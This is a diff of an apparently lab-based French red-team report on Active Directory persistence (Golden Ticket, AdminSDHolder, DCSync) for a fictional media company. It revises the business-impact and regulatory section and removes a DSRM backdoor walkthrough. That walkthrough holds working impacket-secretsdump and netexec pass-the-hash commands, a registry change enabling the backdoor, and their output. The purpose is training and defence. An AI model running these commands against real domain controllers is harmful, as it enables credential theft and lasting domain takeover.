@@ -408,123 +408,32 @@ AdminSDHolder cleaned
 
 ## Impact métier — MediaTech Groupe SA
 
-### Synthèse narrative
+### Synthèse
+À ce stade, l'attaquant **détient déjà le domaine** et installe sa **persistance** : DCSync de tous les secrets, **Golden Ticket** (krbtgt), portes dérobées ACL (AdminSDHolder), éventuellement DCShadow. La caractéristique n'est plus l'accès — c'est la **durabilité** : même après un reset de mots de passe, l'attaquant peut **revenir**. Pour une rédaction, c'est le scénario où l'on ne sait plus si l'on a vraiment repris le contrôle, ni si les échanges avec les sources ont fuité.
 
-Un attaquant ayant obtenu les hash krbtgt des trois domaines de MediaTech Groupe SA dispose d'un accès persistant, illimité dans le temps, et résistant aux tentatives de remédiation partielle. Les Golden Tickets forgés donnent accès à l'ensemble des ressources — serveurs, bases de données, messagerie, partages — sans déclencher d'alerte standard. La backdoor AdminSDHolder se répare automatiquement toutes les heures, rendant la remédiation manuelle inefficace. La seule réponse adéquate est une reconstruction partielle de l'AD avec rotation complète des secrets Kerberos.
+### Gravité : 🔴 CRITIQUE *(dominance + persistance ; l'éradication, pas seulement l'accès, devient le problème)*
 
-### Estimation financière
+### Impact chiffré
 
-| Poste | Estimation |
-|-------|-----------|
-| Reconstruction AD (3 domaines, rotation krbtgt x2, nettoyage ACL) | 300 000 — 800 000 € |
-| Investigation forensique (identification scope, timeline, lateral) | 150 000 — 400 000 € |
-| Interruption activité (reconstruction 5-15 jours) | 500 000 — 2 000 000 € |
-| Notification RGPD + audit CNIL | 50 000 — 200 000 € |
-| Perte de confiance / réputation | 500 000 — 2 000 000 € |
-| **Total estimé** | **1 500 000 — 5 400 000 €** |
+| Poste | Estimation | Hypothèse |
+|---|---|---|
+| Arrêt + reconstruction de confiance AD | 400 k€ – 1,5 M€ | La persistance impose souvent un **rebuild AD** (double rotation krbtgt testée, voire nouvelle forêt) — bien plus lourd qu'un simple nettoyage. |
+| Exposition RGPD massive | 300 k€ – 2 M€ | Tous les secrets exfiltrés → toutes les bases (abonnés, RH, finance). Notification CNIL + personnes. |
+| Atteinte aux sources journalistiques | *non chiffrable — existentiel* | Si des échanges rédactionnels ont fuité : perte de confiance des sources, risque légal (protection des sources). C'est l'atteinte au **titre**, pas au bilan. |
+| Réponse à incident majeure prolongée | 200 k€ – 500 k€ | DFIR long (chasse aux persistances), cellule de crise, communication de crise. |
+| **Total réaliste** | **~1 M€ – 4 M€+** | La partie financière est bornable ; l'atteinte réputationnelle/éditoriale ne l'est pas. |
 
-### Matrice de risque
+> **Réalité rédaction** : le vrai cauchemar n'est pas que le journal ne sorte pas un jour — c'est de ne **jamais être sûr** d'avoir viré l'intrus. Un Golden Ticket valide 10 ans, une ACL DCSync posée discrètement : on peut « nettoyer » et se faire re-compromettre le mois suivant. À ce niveau, on ne restaure pas, on **reconstruit la confiance**.
 
-```mermaid
-quadrantChart
-    title Matrice de risque SC-AD-009
-    x-axis Probabilité faible --> Probabilité élevée
-    y-axis Impact faible --> Impact élevé
-    quadrant-1 Risque critique
-    quadrant-2 Risque élevé
-    quadrant-3 Risque faible
-    quadrant-4 Risque moyen
-    Golden Ticket 3 domaines: [0.85, 0.99]
-    Silver Ticket invisible: [0.80, 0.85]
-    AdminSDHolder auto-repair: [0.75, 0.95]
-    DCSync complet 19 hashes: [0.90, 0.95]
-    Trust keys cross-forest: [0.70, 0.90]
-```
+### Réglementaire
+- **RGPD Art. 32 + 33/34** — compromission totale, notifications.
+- **NIS2 Art. 21 + 23** — incident significatif, obligation de notification et de mesures de continuité.
+- **ISO 27001 A.8.2** (privilèges), **A.8.16** (surveillance des activités), **A.5.29** (sécurité pendant une perturbation — continuité), **A.5.26** (réponse aux incidents).
+- **Presse** — protection des sources (loi du 4 janvier 2010) si des données rédactionnelles sont exposées.
 
-### Impact réglementaire
-
-- **RGPD (Article 32)** : la persistance via Golden Ticket et AdminSDHolder constitue un accès non autorisé permanent à toutes les données personnelles des 3 domaines. Notification CNIL obligatoire sous 72h.
-- **NIS2 (Article 21)** : l'absence de rotation planifiée du krbtgt et d'audit AdminSDHolder démontre un défaut de gouvernance des secrets cryptographiques sur l'infrastructure d'authentification critique.
-- **ISO 27001 (A.8.15, A.5.15)** : absence de monitoring des tickets Kerberos forgés et de revue des ACL AdminSDHolder.
-
-### Top 5 actions prioritaires
-
-**0-24h (urgence)**
-1. Rotation du mot de passe krbtgt **deux fois** (intervalle 10h) sur les **3 domaines** — invalide tous les Golden Tickets
-2. Auditer et nettoyer les ACE non standard sur AdminSDHolder
-
-**1 semaine**
-3. Rotation des mots de passe de tous les comptes machine ($) — invalide les Silver Tickets
-4. Activer le monitoring SIEM des Event IDs 4768 (TGT anomalies) et 5136 (modifications AdminSDHolder)
-
-**1 mois**
-5. Implémenter une rotation krbtgt planifiée (tous les 180 jours) + audit trimestriel AdminSDHolder + revue des trust keys inter-forêts
-
-### Décisions attendues du COMEX
-
-- **Déclencher le plan de rotation krbtgt en urgence** — impact utilisateurs : invalidation de tous les tickets Kerberos en cours, reconnexion requise. Planifier en heures creuses.
-- **Valider le budget reconstruction AD** — 300 000 à 800 000 € selon l'étendue de la compromission.
-- **Mandater un audit forensique** pour déterminer la timeline de compromission et l'étendue réelle de l'accès.
-- **Approuver la politique de rotation** : krbtgt tous les 180 jours, comptes machine annuellement.
-
----
-
-### Phase 5 — DSRM Backdoor (Persistance DC)
-
-Le Directory Services Restore Mode (DSRM) est un mot de passe local défini lors de la promotion d'un serveur en DC. En changeant la clé de registre `DsrmAdminLogonBehavior` à 2, ce mot de passe local devient utilisable pour l'authentification réseau — même si le mot de passe DA du domaine est changé.
-
-**Pourquoi c'est dangereux** : le hash DSRM n'est PAS lié au mot de passe domain Administrator. Même après une rotation complète des mots de passe du domaine, le hash DSRM reste valide. C'est une backdoor persistante qui survit à toute remédiation standard.
-
-**13. Extraction du hash DSRM local**
-
-```bash
-impacket-secretsdump north.sevenkingdoms.local/administrator@192.168.10.11 -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' -history
-```
-
-```
-[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
-```
-
-Le hash DSRM local est `dbd13e1c4e338284ac4e9874f7de6ef4`.
-
-> Note : dans GOAD le hash DSRM est identique au hash DA — en production ils sont souvent différents, ce qui rend cette backdoor encore plus insidieuse.
-
-**14. Activation de l'authentification réseau DSRM**
-
-```bash
-netexec smb 192.168.10.11 -u 'administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local -x 'reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f'
-```
-
-```
-The operation completed successfully.
-```
-
-La valeur `DsrmAdminLogonBehavior = 2` permet l'authentification réseau avec le compte DSRM local quand le service AD est arrêté OU en fonctionnement.
-
-**15. Validation de l'accès via auth locale**
-
-```bash
-netexec smb 192.168.10.11 -u 'administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --local-auth
-```
-
-```
-SMB   192.168.10.11   445   WINTERFELL   [+] WINTERFELL\administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!)
-```
-
-Accès admin via auth locale confirmé — `WINTERFELL\administrator` (pas `NORTH\administrator`). Cette backdoor persiste même après rotation du mot de passe DA.
-
-**16. Cleanup**
-
-```bash
-netexec smb 192.168.10.11 -u 'administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -d north.sevenkingdoms.local -x 'reg delete "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /f'
-```
-
-```
-The operation completed successfully.
-```
-
----
+### Décision COMEX
+- **Valider et financer un plan de reconstruction de confiance AD** (procédure de double rotation krbtgt testée, chasse aux persistances AdminSDHolder/ACL DCSync/comptes machine) — décision de reconstruction, pas de rustine.
+- **Dimensionner la cyber-assurance et la cellule de crise sur ce scénario précis** (incident majeur prolongé + volet réputationnel/sources), et déclencher le **plan de communication de crise** validé en amont.
 
 ## Détection SOC / SIEM
 
